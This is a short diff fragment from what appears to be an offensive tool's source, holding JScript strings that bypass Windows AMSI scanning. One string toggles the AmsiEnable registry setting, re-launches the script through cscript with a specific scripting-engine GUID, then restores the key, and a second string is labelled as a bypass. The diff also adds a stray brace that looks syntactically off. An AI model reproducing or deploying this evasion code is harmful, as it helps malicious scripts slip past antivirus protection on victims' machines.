@@ -16,7 +16,8 @@ try{
 	sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1); // blocking call to Run()
 	sh.RegWrite(key, 1, "REG_DWORD"); // put it back
 	WScript.Quit(1);
-}\n\n"""
+}
+{\n\n"""
 
     js_bypass_1 = """\nvar regpath = "HKCU\\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable";
 var exit=0;
